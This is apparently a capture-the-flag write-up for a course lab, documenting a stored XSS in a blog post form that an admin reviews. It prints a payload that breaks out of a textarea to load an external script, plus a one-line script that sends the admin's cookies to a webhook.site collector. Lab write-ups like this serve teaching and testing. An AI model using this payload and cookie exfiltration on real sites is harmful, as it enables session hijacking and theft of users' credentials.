Challenge `Read my lips: No more scripts` writeup

- Vulnerability: What type of vulnerability is being exploited
  - _Cross-site scripting (XSS)_
- Where: Where is the vulnerability present
  - _Blog post submission form (content field)_
- Impact: What results of exploiting this vulnerability
  - _Allows to run arbitrary JavaScript code in the victim's browser by injecting crafted payloads in the content field of the blog post submission form, making it possible to redirect the victim's cookies to a controlled server_

NOTE: Taking advantage of the fact that the admin needs to approve the blog posts before they are published, it is possible to craft a payload that redirects his cookies to a controlled server (set up using `Webhook.site` at `https://webhook.site/c4fb7495-1912-4963-afd0-93a0676c6909`). Opening the post for approval will show its title and content in the admin's browser. Since the content is shown inside a `textarea` tag, it is possible to inject JavaScript code by closing the tag and adding a script after it. However, the blog post submission form is protected, forbidding inlining scripts. This can be bypassed by loading the script from an external source.

## Steps to reproduce

1. Access the vulnerable application homepage at `/` endpoint.

2. Submit a blog post with an arbitrary title and content.

3. In the under-approval blog post page, inject the following payload executing the script loaded from an external source:
```html
</textarea><script src="http://web.tecnico.ulisboa.pt/ist195584/ssof/script.js"></script><textarea>
```

3. Create a script that redirects the admin's cookies to a controlled server. The script used in this case is available at `http://web.tecnico.ulisboa.pt/ist195584/ssof/script.js` and is loaded from the `script` tag injected in the content field of the blog post submission form. The content of the script is the following:
```javascript
window.location="https://webhook.site/c4fb7495-1912-4963-afd0-93a0676c6909/?cookie="+document.cookie;
```

4. Submit the post for review and when the admin opens the blog post for approval, the script is executed in his browser, redirecting his cookies to the controlled server and logging them under the `cookie` query parameter in the server's dashboard. The flag is available at the cookie value of the `SECRET` cookie.